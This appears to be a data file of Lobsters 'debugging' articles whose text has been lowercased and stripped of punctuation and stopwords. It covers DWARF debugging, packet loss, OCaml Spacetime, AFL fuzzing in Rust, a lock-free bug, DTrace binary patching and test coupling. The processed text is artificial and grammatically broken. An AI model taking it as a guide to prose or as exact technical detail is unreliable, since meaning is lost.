dwatname indirect string offset helloc dwatcompdir indirect string offset tmp dwatlowpc dwathighpc dwatstmtlist abbrev number dwtagbasetype dwatbytesize dwatencoding unsigned dwatname indirect string offset long unsigned int abbrev number dwtagbasetype dwatbytesize dwatencoding unsigned char dwatname indirect string offset unsigned char abbrev number dwtagbasetype dwatbytesize dwatencoding unsigned dwatname indirect string offset short unsigned int abbrev number dwtagbasetype dwatbytesize dwatencoding unsigned dwatname indirect string offset unsigned int abbrev number dwtagbasetype dwatbytesize dwatencoding signed char dwatname indirect string offset signed char abbrev number dwtagbasetype dwatbytesize dwatencoding signed dwatname indirect string offset short int abbrev number dwtagbasetype dwatbytesize dwatencoding signed dwatname int abbrev number dwtagbasetype dwatbytesize dwatencoding signed dwatname indirect string offset long int abbrev number dwtagbasetype dwatbytesize dwatencoding unsigned dwatname indirect string offset sizetype abbrev number dwtagbasetype dwatbytesize dwatencoding signed char dwatname indirect string offset char abbrev number dwtagsubprogram dwatexternal dwatname indirect string offset main dwatdeclfile dwatdeclline dwatprototyped dwattype dwatlowpc dwathighpc dwatframebase byte block dwopcallframecfa dwatgnualltailcallsites abbrev number tour let finish reflection good bad way thing descriptive debugging good debugging convoluted longwinded way metadata instead apparently simpler vm way thing vms debug server integrated runtime offer fixed highlevel command interface allows vm compiletime implementation decision stay hidden need tell debugger storage laid local variable live command interface pitched higher level abstraction detail remain internal vm convenient vm implementer since generation debugging information onerous implement also requires cooperation debuggee couple debugger fixed command language wire protocol present strictly le information developer vm debugger designed around abstraction boundary source language metadatabased debugging actively enables descending boundary sometimes useful debugging tool expose implementation detail way obvious case faced compiler vm bug user would like shift lower level inspect assembly code vm state time performance bug developer hunch cache paging effect able see raw address raw memory content help even program running vm highly descriptive debugging metadata document large number implementation decision taken compiler useful debugger also profilers language runtimes c exception handling usually built dwarf frame information dynamic analysis tool valgrind family debugging optimised code without deoptimising debugging metadata must describe optimised code contrast vm debug server typically arrange debugserver operation need deal unoptimised stack frame simplygenerated code eg templatebased jit confusingly even fullspeed debugging feature hotspot us dynamic deoptimisation get back unoptimised earlier approach run whole program interpreter whenever wanted debuggable execution general debuggable vm instance must either refrain optimisation know dynamically undo optimisation debugger attached dynamic deoptimisation exactly full speed native debugger execution still slows significantly debugger attached vm implement debug operation unoptimised code restriction help make debug server simple cost debugtime performance flip side vm debugging pretty good precisely maintaining sourcelevel abstraction modulo vm bug without complicating task implementing optimisation meanwhile unixland debugging experience remains besteffort good compilergenerated metadata sometimes wrong incomplete following complex transformation optimisation debuggability tension debuggability usually take hit smooth debugging experience still sometimes relies separate unoptimised debug build tail call optimisation classic debugginghindering optimisation since rely eliding stack frame meaning debugger know many recursive call logically sourcelevel stack instruction scheduling another order operation executed code need match source program order make debugtime confusion control problem property incidental tend true current unixstyle debugging debugger support exercising target language control feature exception thread allocation uneven ca nt described purely metadata need interaction host runtime dwarf similar debugging information good static describing decode program state good describing protocol interaction language runtime necessar performing operation spawning thread allocating object throwing exception tend difficult unless happen cleanly exposed entry point language runtime practice debugger usually achieve thing magic knowledge particular implementation least one semiportable interface emerged aim encapsulating runtime control operation debugger benefit thinking libthreaddb best described joe damato excellent article unfortunately abomination violates principle implementation detail described architectureindependent metadata odd cleaner consistent alternative would bundle snippet dwarf bytecode runtime debug information language runtime either simply calling runtime cleanly abstracted operation something complex technical possibility proposal working demo far aware maybe make one might sound wacky know early history java oak green project see certain uncanny similarity idea level abstraction debugging multiple level abstraction neat facility unixstyle debugging also difficult power control useful switch assemblylevel view switch language capability nt generalise case many abstraction layer built within language think c debugger let continue next source line nt know keep abstraction level next source line deep inside library implementing something fairly basic like smart pointer skip far line whereas probably wanted stay roughly level abstraction perhaps within codebase thing get particularly bad lot inlining c traditional step step hint need crude better currently beyond debugger ken problem could solved perhaps bringing knowledge library source file tree debugger already perhaps simply allowing programmer manually mark boundary layer could simple partitioning source file binary object could something complex perhaps sensitive calling context argument value consider case library used two place application next style operation could defined term layer love see although detail would take lot working continued plenty research done debuggable language implementation research area nt seem get attention deserves one problem debugging usually afterthought researcher even though essential programmer another problem many pl researcher sight design space familiar either unixstyle approach vmstyle one hope future figure get best world devel permanent link contact validate page
483,Lobsters,debugging,Debugging,Packet Loss for an App-Level Developer. Part I,http://ithare.com/packet-loss-for-an-app-level-developer-part-i-router-failures-bgp-convergence-time-aqm-traffic-shapers/,packet loss applevel developer part,bug hare book beta testing development deployment mog table content fundamental property internet ip packet whole ip packet nothing ip packet save stevens every ip packet inherently unreliable channellevel retransmits realworld issue router failure bgp convergence time manually handled failure handling mass disconnect autonomous system routerlink overload aqm traffic shaping acknowledgement gordeev animation graphic,author bug hare follow job title sarcastic architecthobbies thinking aloud arguing manager annoying hr calling spade spade keeping tongue cheek chapter f beta volume iv upcoming book development deployment multiplayer online game currently betatested betatesting intended improve quality book provides free ecopy release book help improving detail see book beta testing content published beta testing subject change book published navigate book may want use development deployment mog table content todo move beginning chapter speaking programming networkrelated app usually little attention paid question whether app going run internet locally lan theory indeed difference whatsoever longstanding perception use tcp http whateverelse smart tcpip stack everythingweneed u practice however simple whenever starting speak lowlatency scenario involved game stock exchange statement tends fall apart really really quickly fundamental property internet effect describe related nature internet apply regardless transportlevel applevel protocol used result time speak term tcp udp rather concentrate good old ip packet belongs level aka osiiso networking model ip packet whole ip packet nothing ip packet save stevens first need mention two absolutely fundamental property internet everything internet transferred via ip packet whatever internet implemented top exchanging ip packet tcp stream nothing sequence ip packet udp datagrams ip packet udp header starting payload ipsec vpn yet another type ip packet networkrelated protocol using fit pattern arp effectively bind inherently confined local network local network respective looking bit different angle want send something two box sitting arbitrary point internet must use ip packet achieve local even covering half globe sense none cover whole internet every ip packet inherently unreliable second fundamental property internet say every ip packet danger lost router switch actually pretty much every device form internet infrastructure allowed drop every packetall router switch actually pretty much every device form internet infrastructure allowed drop every packet absolutely way tell hey packet sooooo important must deliver single packet pretty property simplifies implementation internet greatly moreover arguably without internet able work work significant implication particular need reliable delivery anything responsibility communication endpoint detect packet lost b resend packet exactly tcp reliable udp however implication specifically detecting lost packet take time resending take time combined fact tcp stream outoforder delivery really option primary reason tcp tends cause higher latency presence lost packet even nagle algorithm disabled todo section channellevel retransmits case especially physical channel expected poor andor unstable channellevel protocol usually acknowledgement initiate retransmit packet acknowledged one example protocol bluetooth turn often used tethering however trickery affect fundamental property packet losable even one single channel provides kind guarantee others normally router normally provide guarantee processing ability either indeed channel ip packet travel sortareliable speaking internet whole every ip packet still must considered risk lost realworld issue two fundamental property mind start discussing subtle issue realworld internet let start discussing thing happen internet another perspective isp router ie including connection connection home modem isp etc router failure bgp convergence time manually handled failure everything fail router typical overtheinternet path chance one fail rather higheverything fail router typical overtheinternet path chance one fail rather high happens router somewhere internet fails adjacent router eventually understand one peer failed switch alternative path route packet even halfdecent isps alternative path known multihoming defacto standard least year mean time effect failed router limited usually packet loss detectandswitchtoalternativepath window time known bgp convergence time typical value minute applevel developer perspective mean one common scenario happen packet loss time minute imagine going serious disruption affected player disruption going frequent customersplayers still important account two reason simultaneous connection see happening regular basis problem per se least need make sure client behaves reasonably circumstance oh prepared answer claim coming playerscustomers hey whole internet work except site problem must quite often complaint come major router somewhere way go one system exhibited problem related n lookup place n deemed small however oneway packet loss client really smallworse failed router happens close server border router large isp seen fail much frequently backbone router experience packet loss many thousand connection time especially using protocol better think scenario test system upon time one system exhibited problem related n lookup place n deemed small however oneway packet loss client really small unnecessarily increased recovery time problem minute got lucky time effect could much worse addition router failure occasionally switchtoalternatepath logic work whatever reason large isp think comcast involved easily lead problem lasting halfanhour hour affecting much client population moment smaller isps problem last much longer whole day limit affect much smaller population playerscustomers rarely cause systemwide problem handling mass disconnect whenever large isp affecting player fails might want declare emergency state mass disconnect handle situation gracefully disconnected realworld example personally seen turnbasedgamewithtimecontrol implementing detection mass disconnect saying something along line hey internetwide event occurred limiting access large portion player result timeouts increased limit damage disconnected btw system accepted well player logic behind system go twofold problem certainly beyond control affected chance abuse universal rule everybody graceful handling wellaccepted easily happen anybody ie player think one affected next time type game ymmv even game moba still consider going far declaring current ranking match nonranking ground turnbased game increased timeouts autonomous system autonomous system collection connected internet protocol ip routing prefix present common clearly defined routing policy wikipedia noted smaller isps failure may much problem whole ecosystem technically psychologically still might want detect massive failure ip clustersas range say turnbased game could still try increase timeouts though affected note explain player going ie mode introduced player get special handling thing individual player fly simple build abuse simulating network failure however hundred player cityisp disconnected time chance abuse go tremendously routerlink overload live world cause lost packet faulty router life would much better assure however packet loss inherent property modern internet even fault least internet heavily oversubscribed add capacity sold endusers fit internet backbone far least order quite bit oversubscription put mildly word even u would start using bandwidth paying time internet would fatally many customer using internet given moment exactly subject law big number mean time time certain router andor certain link internet get overloadedas many customer using internet given moment exactly subject law big number particular worldwide event mean time time certain router andor certain link internet get overloaded happens usually manifested certain queue router either incoming one router hardware overloaded outgoing one channel overloaded becoming full soon queue full new packet arrives well packet get dropped every ip packet lost router perfectly within right later simplistic obvious policy came naturally first router implemented got fancy name droptail queue discipline developer perspective overload look certain percentage ip packet way client server lost case overload percentage ip packet lost easily go high positive side though say time packet loss probabilistic packet usually lost burst well long loss percentage relatively low heard time kind misconfiguration otoh really matter much current normal residential isp oversubscription ratio like oversubscriptions isps ok first would residential isps failing really badly oversubscription isps upstreams upstreams would get overloaded theory go way far know quite rare practice aqm simplistic droptail policy ie dropping packet router really option mechanism nonfaulty router dropping packet however time realized sharp difference good router state nothingisdropped bad router state quite packet dropped reduces overall bandwidth utilization looking bit different perspective prevents isps selling even oversubscribed channel deal bunch technique collectively known active queue management aqm introduced nutshell idea behind aqm go along following line router start dropping packet queue full though loaded enough aqminduced packet loss always happens probabilistic manner certain percentage ip packet get dropped percentage packet loss different class ip packet may vary depending ip header field protocol diffserv turn allows prioritization different class traffic could really nice side effect aqm prioritization would really occur wide scale beyond common thrashing icmp oblivion exact algorithm vary quite bit difference scope discussion affect much anyway example different queue discipline include red rred codel dozen others tcp observes dropped packet interprets indication congestion slows downtcp observes dropped packet interprets indication congestion slows mechanism built tcp long though recently much effort spent tcp congestion control dozen different algorithm developed popular one cubic compound tcp exactly optimize throughput facing evenmoreoverloaded internet turn enabled aqm vast majority internet traffic tcp whole thing indeed help solving problem improving average bandwidth utilization aka allow isps oversubscribe even keeping congestion check u developer main takeout aqm likely even overloaded path client server packet still lost experience tell effect losing packet without pronounced channel overload much le prominent like year ago steady though rather slow tendency increase aqm latency positiveforgamedevsside quite scenario aqm improve latency one common scenario go follows especially important practice isprouterontheothersideofclient slastmile overloaded router link somewhere path traffic overloaded routerlink mix heavy tcp downloads gaming traffic without aqm overloaded routerlink would hopelessly overloaded heavy tcp downloads aqm affected router start dropping packet bit earlier still space queue early packet drop cause heavy tcp downloads slow turn improve chance nondownload traffic gaming traffic get without much delay effect observed practice however moment say pronounced within modern internet also notsoimportant purpose applevel much iirc early strictly speaking aqm issue explicit congestion notification ecn starting drop packet practice still happening occasionally least ie router space queue traffic shaping related quite different form isps messing client connectivity socalled traffic shaping applies whenever limit enduser connectivity imposed last mile channel ie channel enduser isp logic behind last mile isp side day often come kind arrangement unlimited traffic fine print saying first traffic per month restricted connection traffic shaping come play enforce past facing traffic shaper thing often went really badin past facing traffic shaper thing often went really bad imo two different process contributed problem due traffic shaper severe quite traffic shaper past operating along line predefined interval calculating traffic allowance start interval starting drop packet allowance exceeded used interval significantly larger rtt caused long packet loss burst turn exhibited pretty bad overall effect generally much worse probabilistic loss aqmstyle early tcp really good operating connection orso packet loss loss able make ancient tcp stack pretty much unusable thing even worse case bursted packet loss lasted longer rtt day though situation significantly improved client may still experience regular packet loss traffic run traffic shaper two improvement usually observed number traffic shaper atrociously long packet loss burst b least modern tcp stack tend handle packet loss much gracefully actually traffic shaper behaves nicely pretty much indistinguishable aqm router still say currently existing traffic shaper indistinguishable aqm router cause quite bit pretty nasty packet loss burst maybe intermittent connectivity better term tbh know understanding even simple decrease monitoranddrop interval roughly trick todo route change different route time latter allowed quite uncommon todo priority incl diffserv smaller packet concludes beta chapter f upcoming book development deployment multiplayer online game social game mmofps social game stay tuned beta chapter g covering way packet lost affect applevel programming acknowledgementcartoons sergey gordeev gordeev animation graphic prague
484,Lobsters,debugging,Debugging,A brief trip through Spacetime,https://blogs.janestreet.com/a-brief-trip-through-spacetime/,brief trip spacetime,readme generating profile profspacetime web viewer live word allocated word terminal viewer,spacetime new memory profiling facility ocaml help find space leak unwanted allocation whilst still little rough around edge found useful tool since much documentation using spacetime beyond readme written little intro give people idea use generating profile example spacetime action let get profile jsofocaml compiler first need spacetimeenabled ocaml compiler opam switch eval opam config env using compiler build executable case let opam build u opam install jsofocaml run executable using environment variable ocamlspacetimeinterval turn profiling specify frequently spacetime inspect ocaml heap millisecond jsofocaml corekernelcma executables spacetime enabled run slowly use system memory usual content ocaml heap unaffected running executable produce file current directory l grep spacetime pid process executable fork may multiple spacetime file spacetime profile need install profspacetime profile viewer opam switch eval opam config env opam install profspacetime next process profile profspacetime process e processing series done l grep spacetime take couple minute case e option used pas profspacetime executable produced profile option strictly necessary without profile include location c code web viewer ready look profile start using web viewer profspacetime serve p processing series done serving live word navigating appropriate address browser greeted exciting colourful graph graph show number live word program time divided source location word allocated place mouse section graph display source location section clicking section taken new graph graph contains live word allocated clicked source location divided source location call function performed allocation ie next frame backtrace key feature spacetime see word allocated listmap see call listmap allocated continuing click graph get entire backtrace word allocated clicking top stack link return u original graph allocated word live graph live word live block useful locating space leak removing unwanted allocation allocation graph useful clicking allocated word link shown new graph graph show cumulative total allocation program divided source location allocation holding mouse section display location section clicking section take new graph containing allocation section divided location next frame backtrace terminal viewer try terminal viewer profspacetime view p launch u lambdaterm style terminal view show live word particular time program execution divided source location word allocated key move different point time key select different row pressing return row load new view show live word allocated selected source location memoryc divided source location call function containing allocation ie next frame backtrace pressing backspace take u back previous view finally pressing tab switch three different mode live word live block allocated word use q key exit viewer
486,Lobsters,debugging,Debugging,American Fuzzy Lop’ing Rust,http://blog.troutwine.us/2017/01/06/american-fuzzy-loping-rust/,american fuzzy lop ing rust,american fuzzy lop wait bunny american fuzzy lop sold lead promised land quantiles effective computation biased quantiles data stream frewsxcv setup documentation aflrs tutorial line parallel fuzzing sure lot fiddling open issue libfuzzer,last six month rust work postmates lowlevel finicky kind thing particular software constructing must high throughput tolerable latency system highscale realtime must consume cpu ram tolerably deterministic fashion relative input request must perform computation high degree certainty computation done correctly system must experience runtime crash fair bit wiggle room system highscale realtime latency spike okay sometimes postmates really really need system resource hog regression area accepted understanding regression bounded correctness building empirical total system model important organization invested rigorous formal method wiggle room last requirement post going talk use american fuzzy lop demonstrate correctness purpose regard runtime crash rust codebase neat tool wait bunny american fuzzy lop afl tool describes like american fuzzy lop securityoriented fuzzer employ novel type compiletime instrumentation genetic algorithm automatically discover clean interesting test case trigger new internal state targeted binary substantially improves functional coverage fuzzed code compact synthesized corpus produced tool also useful seeding labor resourceintensive testing regime road mean afl tool chuck bunch random data specially compiled program seek crash hang really good finding interesting random data chuck said program afl chuck random data program us special instrumentation placed binary determine afl stumbled new control path afl work discover new path end exercising might careful thinking manual experimentation alone c c memory access something tightrope act really important tool rust sure cut balancing skill needed still open runtime crash integer overflow unwraps never happen judicious use unsafe block looked totally safe turn actually sold lead promised land going need two thing library specially compiled afl instrumentation runner program runner program wee thing read afl random nonsense stdin convert structured random nonsense system test feed one get compilation environment going runner program look like let get motivating example going couple month ago opensourced part work posmates library called quantiles particular implemented effective computation biased quantiles data stream calling quantiles ckms library ckms numeric crunching algorithm bound input get defined paper prime target afl afl work without specially compiled program sloooooow going need compile rust code afl instrumentation built fortunately frewsxcv really kindly done hard work u made special build rust compiler needed made docker container build rust per setup documentation needed get environment going docker pull coreyaflrs business let clone quantiles git githubcom postmatesquantilesgit per aflrs tutorial need make change quantile cargotoml well small change sprinkled commit diff need make happen diff git acargotoml bcargotoml index acargotoml bcargotoml keywords statistic histogram quantiles percentile approximatio profilerelease lto true debug true devdependencies quickcheck dependency serde afl aflplugin builddependencies serdecodegen diff git ainbasics binbasics new file mode index devnull binbasics diff git asrclibrs bsrclibrs index asrclibrs bsrclibrs approximate algorithm provide guarantee around space consumption deny missingdocs missingdebugimplementations missingcopyimplementations unsafecode unstablefeatures unusedimportbraces unusedqualifications doc htmlrooturl http postmatesgithubioquantiles done need runner quantiles library crate create srcmainrs runner later library executable crate sufficient create new executable srcbin srcmainrs following feature plugin plugin aflplugin extern crate afl extern crate quantiles use quantiles ckms ckms use std io use std io bufread use std str fromstr fn main let stdin io stdin stdinlock line println line let pyld vec sunwrap splitwhitespace filtermap f fromstr f ok collect println payload len pyldlen pyldlen return let error pyld let query pyld query query return println error bound error let mut ckms ckms new error f pyld ckmsinsert f println query query println ckmsquery query unwrap parsing stdin vector first element vector error bound ckms second quantile query insertion made remaining element value insertion afl requires initial valid seed start genetic mutation go ahead following mkdir echo inbasics something afl start enter container pulled earlier docker run v pwd source coreyaflrs sh within following container cargo build release aflfuzz targetreleasequantiles little warmup greeted afl ui first inscrutable gradually come inscrutable familiar writing article realized could change runner discover path quickly inside quantiles look finding depth subui turn quantiles still suffered crash crash input afl discovers go outcrashes per flag given cracking one open find cat op honest nt sure make first saw reasoning crash input struck control column suspiciously close zero actually zero time run input runner cat op targetreleasequantiles line ok b payload len error bound thread main panicked attempted calculate remainder divisor zero note run backtrace well look line tracing back insertthreshold defined math turn input error ridiculously small insertthreshold quite large oops line value chopped usize end truncating resolve adjusted minimum error code ckms new look like let error error else error else error minimum error bound ckms user request arbitrary lower bound correct would one take account value std usize max pr change included quantiles question come long let afl run answer long time afl process work different heuristic generate input fast possible perform parallel fuzzing reduce run time control path program longer afl need run discover overnight run smallish enough give confidence much larger system set server continually run afl periodically check milage may vary sure lot fiddling afl rust still relatively new thing sure fiddly open issue bring fuzzing inline way quickcheck work would simply code somewhat would still leave need special compilation toolchain place work done llvm specific fuzzing libfuzzer project bubble rustland good time fiddling well worth rust nt suffer odd memory access problem cc still opportunity computation ending goof occur afl real good finding goof
487,Lobsters,debugging,Debugging,Lock-Free Bugs,https://research.swtch.com/lockfree,lockfree bug,lockfree bug pdf spin lock changed lock implementation changed server implementation pthreadmutexdestroy leaky abstraction concurrency edsac log wilkes discovery debugging airy tape early chapter history debugging,lockfree bug posted wednesday january pdf wrote post debuggersco seems gone least partly defunct reproducing site collected answer programmer prompt interesting bug encountered interesting bug one reveal fundamental subtle misunderstanding way program work good bug like good science experiment learn something unexpected virtual world exploring ten year ago working networked server used thread coordinating lock condition variable server part plan written c occasionally would crash inside malloc usually mean kind memory corruption due writeafterfree error one day benchmarking bulk server disabled lucky enough crash happen reproducibly server mostly disabled gave head start isolating bug reproducibility made possible cut code piece piece one section clearly implicated code question cleaning client recently disconnected server perclient data structure shared two thread thread r read client connection thread w writes r notice disconnect eof read notifies w wait acknowledgement w free perclient structure acknowledge disconnect w ran code like qlock conn lk conn writerdone qsignal conn writerack qunlock conn lk threadexit wait acknowledgement r ran code like qlock conn lk conn writerdone qwait conn writerack writer done free connection free conn standard lock condition variable piece code qwait defined release lock conn lk wait reacquire lock returning r observes writerdone set r know w gone r free perconnection data structure r call qunlock conn lk reasoning calling qunlock free sends mixed message qunlock suggests coordination another thread using conn free safe thread using conn w thread w gone somehow added qunlock conn lk free conn crash stopped answer look lock implemented conceptually core lock variable two marking unlocked locked acquire lock thread check core marked unlocked mark locked one atomic operation operation atomic two thread attempting acquire lock one succeed call thread hold lock another thread vying core marked locked must decide first simplest approach try eventually thread release lock marking core unlocked point thread b atomic operation succeed approach called spinning lock using approach called spin lock simple spin lock implementation look like struct spinlock int bit void spinlock spinlock lk atomiccmpandset lk bit return void spinunlock spinlock lk atomicset lk bit spin lock core bit field indicate unlocked locked atomiccmpandset atomicset use special machine instruction manipulate lk bit atomically spinning make sense lock never held long b spin loop executes small number time lock held longer period time spinning held waste cpu interact badly operating system scheduler second general approach maintain queue thread interested acquiring lock approach thread b find lock already held add queue us operating system primitive go sleep thread eventually release lock check queue find b us operating system primitive wake b approach called queueing lock using approach called queue lock queueing efficient spinning lock may held long time queue lock queue need lock almost always spin lock library using qlock qunlock implemented struct qlock spinlock spin thread owner threadqueue queue void qlock qlock lk spinlock lk spin lk owner nil lk owner currentthread spinunlock lk spin return push lk queue currentthread spinunlock lk spin ossleep void qunlock qlock lk thread spinlock lk spin pop lk queue lk owner nil oswakeup spinunlock lk spin queue lock core owner field owner nil lock unlocked otherwise owner record thread hold lock operation lk owner made atomic holding spin lock lk spin back bug lock crashing code queue lock acknowledgement protocol r w set race w call qunlock r call qlock either explicit call code implicit call inside qwait call happens first w qunlock happens first r qlock find lock unlocked lock everything proceeds uneventfully r qlock happens first find lock held w add r queue put r sleep w qunlock executes set owner r wake r unlocks spin lock time w unlocks spin lock r may already started running r may already called free conn spinunlock atomicset writes zero conn lkspinbit writeafterfree memory allocator want zero zero may cause crash memory leak behavior server code wrong qunlock wrong fundamental misunderstanding definition queue lock api queue lock required unlocked freed queue lock required support freed locked written queue lock routine part crossplatform library mimicking plan question occurred writing qunlock one one hand queue lock must freed unlocked qunlock implementation correct server must change r call qunlock free r qunlock spinlock must wait w qunlock spinunlock w really gone time r call free hand queue lock freed locked server correct qunlock must change oswakeup give control lk must delayed spinunlock plan documentation queue lock address question directly implementation freeing locked queue lock harmless since using library run unmodified plan software changed lock implementation call oswakeup spinunlock two year later fixing different bug defensively changed server implementation call qunlock case definition posix pthreadmutexdestroy function give different answer design question safe destroy initialised mutex unlocked attempting destroy locked mutex result undefined behaviour learn rationale gave calling qunlock free made implicit assumption two independent looking inside implementation see two intertwined api might specify posix must unlock lock destroying example implementation concern influencing api creating leaky abstraction make bug interesting caused complex interaction manual memory management concurrency obviously program must stop using resource freeing concurrent program must stop thread using resource freeing good day require bookkeeping careful coordination track thread still using resource bad day require reading lock implementation understand exact order operation carried different thread modern computing world client server cloud concurrency fundamental concern program world choosing garbage collection instead manual memory management eliminates source leaky abstraction make program simpler easier reason started post saying good bug help learn something unexpected virtual world exploring especially true maurice wilkes team built edsac first practical storedprogram computer first program ran edsac printing square number ran correctly second log may read table prime attempted programme incorrect saturday making first weekend spent working buggy program learn wilkes later recalled june people begun realize easy get program right one time appeared one journey edsac room punching equipment realization came full force good part remainder life going spent finding error program wilkes p early history see brian hayes discovery debugging martin campbellkelly airy tape early chapter history debugging
488,Lobsters,debugging,Debugging,DTrace at Home,http://dtrace.org/blogs/ahl/2016/12/18/dtrace-at-home/,dtrace home,dtrace home excellent post apple team hooray man page sip easy enough disable randomized dtrace every day,dtrace home procrastinating making family holiday card combination lot plate dreading formulation annual note recapping year great moment glad midnight either make card night leave empty space friend refrigerator adobe illustrator idea first person hit problem seems existed since released none solution working inspired sara mauskopf excellent post rapidly running time bound project enough dtrace colleague scoffed day mean often actually use dtrace mind dtrace big system critical system dollar life stake reply use dtrace every day imagine developing software without dtrace use laptop infrequently something inexplicable forever grateful apple team ported mac o x first wanted make sure name illustrator process right sudo dtrace n syscall entry execname count dtrace description syscall entry matched probe c pboard watchdogd awdd comapplewebkit google chrome google chrome adobe illustrato glad checked adobe illustrato pretty sure illustrator failing setrlimit blowing result let confirm fact returning sudo dtrace n syscall setrlimit returnexecname adobe illustrato printf errno dtrace description syscall setrlimit return matched probe cpu id function name setrlimit return setrlimit failing errno eperm value high nonroot user already tuned file limit pretty high let confirm fact setting file limit check value set write script looked documentation setrlimit hooray man page determine position resource parameter type value parameter struct rlimit needed dtrace copyin subroutine grab structure process address space sudo dtrace n syscall setrlimit entryexecname adobe illustrato r struct rlimit copyin sizeof struct rlimit printf x x x rrlimcur rrlimmax dtrace description syscall setrlimit entry matched probe cpu id function name setrlimit entry looking usrincludesysresourceh see corresponds number file rlimitnofile rlimitposixflag illustrator trying set value apparently big filed latent curiosity another day quickest solution use dtrace whack smaller number struct rlimit easy sudo dtrace w n syscall setrlimit entryexecname adobe illustrato rlimt alloca sizeof rlimt copyout sizeof rlimt sizeof rlimt dtrace description syscall setrlimit entry matched probe dtrace could enable tracing permission denied oh right thank sip isa new laptop least new motherboard due bizarre issue probably contributed illustrator working new yet disabled part sip prevents using dtrace kernel destructive mode eg copyout easy enough disable rebootphobic hate restart terminal went plan b lldb first used dtrace find code calling setrlimit using knowledge isaabi sudo dtrace n syscall setrlimit returnexecname adobe illustrato printf x uintptrt copyin uregs rrsp sizeof uintptrt dtrace description syscall setrlimit return matched probe cpu id function name setrlimit return setrlimit return ran time confirm address call instruction make sure location randomized rush might patched binary apple macho object format always confuses instead used lldb replace call store eax evince successful return value nops padding hex value remember due personal deficiency lldb break set n init breakpoint location lldb run lldb di c callq symbol stub setrlimit lldb memory write lldb di c xorl eax eax nop nop nop next process detach got making holiday dtrace every day dtrace designed solving hard problem critical system need understand system behave exists development consumer system write program mean fix
490,Lobsters,debugging,Debugging,Finding test coupling,http://nedbatchelder.com/blog/201612/finding_test_coupling.html,finding test coupling,noserandomly testanalysispy pudb line deep library changed warning setting dramatic music pull request,get started story problem solved retelling leaving lot small false trail hard learning summarize end report story lecture high share peer help people learn ideally elicit teaching others better next time main quality demonstrating intelligence experience perseverance patience optimismok story running large test suite day got test failure seemed unrelated change making never sure investigated along way used technique narrow widen identify suspectsrunning one test passed running whole test suite failed behavior repeatable kind coupling test ideally test would isolated perfect test isolation would mean matter order ran test matter subset test ran result would clearly perfect test isolationthe job find test coupled perhaps one many possible test coupled withthe test failure unicodeerror trying log warning message involving username nonascii character apparently something work well warning routed logging system message actually logged message nonascii unicode string exception happen unfortunate live momentour best guess moment test pass either warning setting logging setting deciding log warning test fails previous test changed one setting causing message proceed way warningslogging pipeline point producing unicodeerror plausible theory setting global process would easy change without realizing consequence test suitesbut still find test command run one test failed python managepy lm test withid settingstest xunitmpfileedxappedxappedxplatformreportslmsnosetestsxml withdatabaseisolation openedxcoredjangoappsexternalauthteststestopenidproviderpy openidprovidertesttestproviderlogincanhandleunicodeemailinactiveaccount django test runner using nose last line selects one particular test method one particular class one specific test file try find failing combination widen scope test run peeling trailing component give u progressively test run eventually hope test fail openedxcoredjangoappsexternalauthteststestopenidproviderpy openidprovidertest openedxcoredjangoappsexternalauthteststestopenidproviderpy openedxcoredjangoappsexternalauth openedxcoredjangoapps last one finally failed test still many examine manually run test noserandomly randomize order test give u opportunity run experiment randomization tell u something coupling run test failing test fail none test ran one cause problem test fail test ran might badi used bash loop run test capturing output separate result file export flagsblah blah omitted brevity seq echo python managepy lm test v flag openedxcoredjangoapps v test itxt gave test result file look v withid flag gave u output looked like â lotsâ ofâ throatclearingâ hereâ synchronizingâ appsâ withoutâ migration â â creatingâ table â â â â creatingâ tableâ coursewarehistoryextendedstudentmodulehistoryextendedâ â â â runningâ deferredâ sql â â installingâ customâ sql runningâ migration â â noâ migrationsâ toâ applyusingâ testplatformnameâ openedxcoredjangoappssiteconfigurationteststestcontextprocessorscontextprocessortests â â ok testconfigurationplatformnameâ openedxcoredjangoappssiteconfigurationteststestcontextprocessorscontextprocessortests â â ok testgetvalueâ openedxcoredjangoappssiteconfigurationteststesthelperstesthelpers â â ok testgetvaluefororgâ openedxcoredjangoappssiteconfigurationteststesthelperstesthelpers â â ok testgetdictâ openedxcoredjangoappssiteconfigurationteststesthelperstesthelpers â â ok openedxcoredjangoappssiteconfigurationteststesthelperstesthelpers â â ok â muchâ moreâ small python program provided analysis testanalysispy warning python fstrings ahead although run result converged run test maybebad set run reduce set noserandomly behavior fully understand completely shuffle test possibility modulelevel classlevel setup code randomizes within scope intermix scope test module run random order everything one module always run contiguously class within module run random order method within class run contiguouslythe list class testanalysispy provided made clear going maybebad test creditteststestviewspy test file something causing test failure always run contiguously way noserandomly could give u information true culprittime lowtech divide conquer run one class testviewspy failing test class testviewspy get information class examine love tell clever way get list test class manually picked file wrote loop export failingtestopenedxcoredjangoappsexternalauthteststestopenidproviderpy openidprovidertesttestproviderlogincanhandleunicodeemailinactiveaccount c creditcourseviewsettests crediteligibilityviewtests creditprovidercallbackviewtests creditproviderrequestcreateviewtests creditproviderviewsettests echo c python managepy lm test v flag openedxcoredjangoappscreditteststestviewspy c failingtest tee c grep unicodeemail done bashlooping skillz improving time showed three five class failing class use mixins thing three class common authmixin provides four test method probably one method picked first test class ran new experiment four time four test method testauthenticationrequired testoauth testsessionauth testjwtauth echo python managepy lm test v flag openedxcoredjangoappscreditteststestviewspy creditcourseviewsettests failingtest tee grep unicodeemail doneand showed testjwtauth problem twotest scenario would produce failureto find line test could commentout otherwise neuter part test method run fast twotest scenario cause jwt authorization header test client get function call jwtrelated code scarce enough huge code base could identify likely related function place pudb breakpoint start walking code found problem line deep library changed warning setting cue dramatic music commenting line running reproducer confirmed root cause simple pull request fix problem note pull request library test case simple mistake might reason bad line begin withit felt really good find fix problem perhaps took long findas promised thing know wrong test name random data realize result started showing sum knowngood maybebad greater total number test number skittering place canonicalized file name number converged quicklyi understood noserandomly worked earlieri google bash loop syntaxi fatfingered bash loop gave mysterious sometimes discouraging false resultsa time spent reading possible culprit test looking clue fruitless since actual problem line library different repowe learning careful
